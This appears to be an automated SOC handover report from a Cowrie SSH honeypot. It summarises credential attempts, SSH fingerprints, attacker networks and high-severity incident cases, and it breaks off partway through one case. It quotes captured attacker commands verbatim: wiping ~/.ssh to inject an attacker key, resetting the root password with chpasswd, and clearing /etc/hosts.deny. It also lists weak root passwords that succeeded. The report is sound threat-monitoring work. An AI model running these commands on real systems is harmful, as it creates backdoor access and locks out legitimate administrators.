# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-02 |
| **Generated At** | 2026-04-02T13:08:44Z |
| **Shift Time** | 13:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **123** |
| Confirmed Threats | **57** |
| False Positives Filtered | **66** (53.7%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **16** |
| High Severity Cases | **16** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **107** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **44** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **19** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **14** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `345gs5662d34` | 7 |
| `default` | 2 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `20260101` | `209.97.168.111` | 2026-04-02T10:51:32 |
| `root` | `3245gs5662d34` | `209.97.168.111` | 2026-04-02T10:51:34 |
| `root` | `amazon01` | `103.211.219.58` | 2026-04-02T11:29:17 |
| `root` | `3245gs5662d34` | `103.211.219.58` | 2026-04-02T11:29:18 |
| `root` | `A123456@` | `58.48.170.235` | 2026-04-02T12:17:39 |
| `root` | `PAsSwORD` | `101.47.156.170` | 2026-04-02T12:25:02 |
| `root` | `3245gs5662d34` | `101.47.156.170` | 2026-04-02T12:25:06 |
| `root` | `ubuntu` | `116.176.75.150` | 2026-04-02T12:28:11 |
| `root` | `admin32` | `172.172.131.149` | 2026-04-02T12:36:06 |
| `root` | `3245gs5662d34` | `172.172.131.149` | 2026-04-02T12:36:16 |
| `root` | `Ij123456` | `94.156.221.46` | 2026-04-02T12:56:45 |
| `root` | `3245gs5662d34` | `94.156.221.46` | 2026-04-02T12:56:50 |
| `root` | `Ab@#$%` | `94.156.221.46` | 2026-04-02T12:59:47 |
| `root` | `huaweiqwerty123` | `94.156.221.46` | 2026-04-02T13:02:51 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **123** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 28 |
| OpenSSH | 15 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 28 | 9 |
| `acaa53e0a7d7...` | Mirai/variant | 15 | 15 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 28 | 9 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 15 | 15 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:0T22P0TYDYzz"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `58.48.170.235`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `209.97.168.111`, `101.47.156.170`, `172.172.131.149`, `94.156.221.46`, `103.211.219.58`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **28** |
| High-Risk ASNs | **24** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS12479` | Orange Espagne SA | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (16)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7f5110112b6c

| Field | Detail |
|---|---|
| **Source IP** | `209.97.168[.]111` |
| **First Seen** | 2026-04-02 10:51 |
| **Last Seen** | 2026-04-02 10:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:51:32` | `cowrie.session.connect` |
| `2026-04-02 10:51:32` | `cowrie.client.version` |
| `2026-04-02 10:51:32` | `cowrie.client.kex` |
| `2026-04-02 10:51:32` | `cowrie.login.success` |
| `2026-04-02 10:51:32` | `cowrie.session.params` |
| `2026-04-02 10:51:32` | `cowrie.command.input` |
| `2026-04-02 10:51:32` | `cowrie.command.failed` |
| `2026-04-02 10:51:32` | `cowrie.log.closed` |
| `2026-04-02 10:51:33` | `cowrie.session.params` |
| `2026-04-02 10:51:33` | `cowrie.command.input` |
| `2026-04-02 10:51:33` | `cowrie.session.file_download` |
| `2026-04-02 10:51:33` | `cowrie.log.closed` |
| `2026-04-02 10:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.168[.]111` to AbuseIPDB if not already reported
- [ ] Block `209.97.168[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd0d9c456cc

| Field | Detail |
|---|---|
| **Source IP** | `209.97.168[.]111` |
| **First Seen** | 2026-04-02 10:51 |
| **Last Seen** | 2026-04-02 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:51:34` | `cowrie.session.connect` |
| `2026-04-02 10:51:34` | `cowrie.client.version` |
| `2026-04-02 10:51:34` | `cowrie.client.kex` |
| `2026-04-02 10:51:34` | `cowrie.login.success` |
| `2026-04-02 10:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.97.168[.]111` to AbuseIPDB if not already reported
- [ ] Block `209.97.168[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0bef9ff9e7f

| Field | Detail |
|---|---|
| **Source IP** | `103.211.219[.]58` |
| **First Seen** | 2026-04-02 11:29 |
| **Last Seen** | 2026-04-02 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 11:29:17` | `cowrie.session.connect` |
| `2026-04-02 11:29:17` | `cowrie.client.version` |
| `2026-04-02 11:29:17` | `cowrie.client.kex` |
| `2026-04-02 11:29:17` | `cowrie.login.success` |
| `2026-04-02 11:29:17` | `cowrie.session.params` |
| `2026-04-02 11:29:17` | `cowrie.command.input` |
| `2026-04-02 11:29:17` | `cowrie.command.failed` |
| `2026-04-02 11:29:17` | `cowrie.log.closed` |
| `2026-04-02 11:29:17` | `cowrie.session.params` |
| `2026-04-02 11:29:17` | `cowrie.command.input` |
| `2026-04-02 11:29:17` | `cowrie.session.file_download` |
| `2026-04-02 11:29:17` | `cowrie.log.closed` |
| `2026-04-02 11:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.219[.]58` to AbuseIPDB if not already reported
- [ ] Block `103.211.219[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7dfeb1c888

| Field | Detail |
|---|---|
| **Source IP** | `103.211.219[.]58` |
| **First Seen** | 2026-04-02 11:29 |
| **Last Seen** | 2026-04-02 11:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 11:29:18` | `cowrie.session.connect` |
| `2026-04-02 11:29:18` | `cowrie.client.version` |
| `2026-04-02 11:29:18` | `cowrie.client.kex` |
| `2026-04-02 11:29:18` | `cowrie.login.success` |
| `2026-04-02 11:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.219[.]58` to AbuseIPDB if not already reported
- [ ] Block `103.211.219[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35c8c607885

| Field | Detail |
|---|---|
| **Source IP** | `58.48.170[.]235` |
| **First Seen** | 2026-04-02 12:17 |
| **Last Seen** | 2026-04-02 12:18 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0T22P0TYDYzz"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:17:38` | `cowrie.session.connect` |
| `2026-04-02 12:17:38` | `cowrie.client.version` |
| `2026-04-02 12:17:38` | `cowrie.client.kex` |
| `2026-04-02 12:17:39` | `cowrie.login.success` |
| `2026-04-02 12:17:39` | `cowrie.session.params` |
| `2026-04-02 12:17:39` | `cowrie.command.input` |
| `2026-04-02 12:17:39` | `cowrie.command.failed` |
| `2026-04-02 12:17:39` | `cowrie.log.closed` |
| `2026-04-02 12:17:39` | `cowrie.session.params` |
| `2026-04-02 12:17:39` | `cowrie.command.input` |
| `2026-04-02 12:17:40` | `cowrie.session.file_download` |
| `2026-04-02 12:17:40` | `cowrie.log.closed` |
| `2026-04-02 12:17:56` | `cowrie.session.params` |
| `2026-04-02 12:17:56` | `cowrie.command.input` |
| `2026-04-02 12:17:56` | `cowrie.log.closed` |
| `2026-04-02 12:17:56` | `cowrie.session.params` |
| `2026-04-02 12:17:56` | `cowrie.command.input` |
| `2026-04-02 12:17:56` | `cowrie.log.closed` |
| `2026-04-02 12:17:57` | `cowrie.session.params` |
| `2026-04-02 12:17:57` | `cowrie.command.input` |
| `2026-04-02 12:17:57` | `cowrie.session.file_download` |
| `2026-04-02 12:17:57` | `cowrie.log.closed` |
| `2026-04-02 12:17:57` | `cowrie.session.params` |
| `2026-04-02 12:17:57` | `cowrie.command.input` |
| `2026-04-02 12:17:57` | `cowrie.log.closed` |
| `2026-04-02 12:17:58` | `cowrie.session.params` |
| `2026-04-02 12:17:58` | `cowrie.command.input` |
| `2026-04-02 12:17:58` | `cowrie.log.closed` |
| `2026-04-02 12:17:58` | `cowrie.session.params` |
| `2026-04-02 12:17:58` | `cowrie.command.input` |
| `2026-04-02 12:17:58` | `cowrie.command.input` |
| `2026-04-02 12:17:58` | `cowrie.log.closed` |
| `2026-04-02 12:17:59` | `cowrie.session.params` |
| `2026-04-02 12:17:59` | `cowrie.command.input` |
| `2026-04-02 12:17:59` | `cowrie.log.closed` |
| `2026-04-02 12:17:59` | `cowrie.session.params` |
| `2026-04-02 12:17:59` | `cowrie.command.input` |
| `2026-04-02 12:17:59` | `cowrie.log.closed` |
| `2026-04-02 12:18:00` | `cowrie.session.params` |
| `2026-04-02 12:18:00` | `cowrie.command.input` |
| `2026-04-02 12:18:00` | `cowrie.log.closed` |
| `2026-04-02 12:18:00` | `cowrie.session.params` |
| `2026-04-02 12:18:00` | `cowrie.command.input` |
| `2026-04-02 12:18:00` | `cowrie.log.closed` |
| `2026-04-02 12:18:01` | `cowrie.session.params` |
| `2026-04-02 12:18:01` | `cowrie.command.input` |
| `2026-04-02 12:18:01` | `cowrie.log.closed` |
| `2026-04-02 12:18:01` | `cowrie.session.params` |
| `2026-04-02 12:18:01` | `cowrie.command.input` |
| `2026-04-02 12:18:01` | `cowrie.log.closed` |
| `2026-04-02 12:18:02` | `cowrie.session.params` |
| `2026-04-02 12:18:02` | `cowrie.command.input` |
| `2026-04-02 12:18:02` | `cowrie.log.closed` |
| `2026-04-02 12:18:02` | `cowrie.session.params` |
| `2026-04-02 12:18:02` | `cowrie.command.input` |
| `2026-04-02 12:18:02` | `cowrie.log.closed` |
| `2026-04-02 12:18:03` | `cowrie.session.params` |
| `2026-04-02 12:18:03` | `cowrie.command.input` |
| `2026-04-02 12:18:03` | `cowrie.log.closed` |
| `2026-04-02 12:18:03` | `cowrie.session.params` |
| `2026-04-02 12:18:03` | `cowrie.command.input` |
| `2026-04-02 12:18:03` | `cowrie.log.closed` |
| `2026-04-02 12:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.48.170[.]235` to AbuseIPDB if not already reported
- [ ] Block `58.48.170[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df8cab7ae89

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]170` |
| **First Seen** | 2026-04-02 12:25 |
| **Last Seen** | 2026-04-02 12:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:25:01` | `cowrie.session.connect` |
| `2026-04-02 12:25:01` | `cowrie.client.version` |
| `2026-04-02 12:25:01` | `cowrie.client.kex` |
| `2026-04-02 12:25:02` | `cowrie.login.success` |
| `2026-04-02 12:25:02` | `cowrie.session.params` |
| `2026-04-02 12:25:02` | `cowrie.command.input` |
| `2026-04-02 12:25:02` | `cowrie.command.failed` |
| `2026-04-02 12:25:02` | `cowrie.log.closed` |
| `2026-04-02 12:25:03` | `cowrie.session.params` |
| `2026-04-02 12:25:03` | `cowrie.command.input` |
| `2026-04-02 12:25:03` | `cowrie.session.file_download` |
| `2026-04-02 12:25:03` | `cowrie.log.closed` |
| `2026-04-02 12:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]170` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db332d678fab

| Field | Detail |
|---|---|
| **Source IP** | `101.47.156[.]170` |
| **First Seen** | 2026-04-02 12:25 |
| **Last Seen** | 2026-04-02 12:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:25:05` | `cowrie.session.connect` |
| `2026-04-02 12:25:05` | `cowrie.client.version` |
| `2026-04-02 12:25:05` | `cowrie.client.kex` |
| `2026-04-02 12:25:06` | `cowrie.login.success` |
| `2026-04-02 12:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.156[.]170` to AbuseIPDB if not already reported
- [ ] Block `101.47.156[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2796b5b07b5

| Field | Detail |
|---|---|
| **Source IP** | `116.176.75[.]150` |
| **First Seen** | 2026-04-02 12:28 |
| **Last Seen** | 2026-04-02 12:33 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:28:09` | `cowrie.session.connect` |
| `2026-04-02 12:28:09` | `cowrie.client.version` |
| `2026-04-02 12:28:09` | `cowrie.client.kex` |
| `2026-04-02 12:28:11` | `cowrie.login.success` |
| `2026-04-02 12:33:12` | `cowrie.session.file_upload` |
| `2026-04-02 12:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.176.75[.]150` to AbuseIPDB if not already reported
- [ ] Block `116.176.75[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60bd7a9caf30

| Field | Detail |
|---|---|
| **Source IP** | `172.172.131[.]149` |
| **First Seen** | 2026-04-02 12:36 |
| **Last Seen** | 2026-04-02 12:36 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:36:04` | `cowrie.session.connect` |
| `2026-04-02 12:36:04` | `cowrie.client.version` |
| `2026-04-02 12:36:05` | `cowrie.client.kex` |
| `2026-04-02 12:36:06` | `cowrie.login.success` |
| `2026-04-02 12:36:08` | `cowrie.session.params` |
| `2026-04-02 12:36:08` | `cowrie.command.input` |
| `2026-04-02 12:36:08` | `cowrie.command.failed` |
| `2026-04-02 12:36:08` | `cowrie.log.closed` |
| `2026-04-02 12:36:10` | `cowrie.session.params` |
| `2026-04-02 12:36:10` | `cowrie.command.input` |
| `2026-04-02 12:36:10` | `cowrie.session.file_download` |
| `2026-04-02 12:36:10` | `cowrie.log.closed` |
| `2026-04-02 12:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.131[.]149` to AbuseIPDB if not already reported
- [ ] Block `172.172.131[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32b4993967b6

| Field | Detail |
|---|---|
| **Source IP** | `172.172.131[.]149` |
| **First Seen** | 2026-04-02 12:36 |
| **Last Seen** | 2026-04-02 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:36:14` | `cowrie.session.connect` |
| `2026-04-02 12:36:14` | `cowrie.client.version` |
| `2026-04-02 12:36:14` | `cowrie.client.kex` |
| `2026-04-02 12:36:16` | `cowrie.login.success` |
| `2026-04-02 12:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.131[.]149` to AbuseIPDB if not already reported
- [ ] Block `172.172.131[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505e21de69dc

| Field | Detail |
|---|---|
| **Source IP** | `94.156.221[.]46` |
| **First Seen** | 2026-04-02 12:56 |
| **Last Seen** | 2026-04-02 12:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
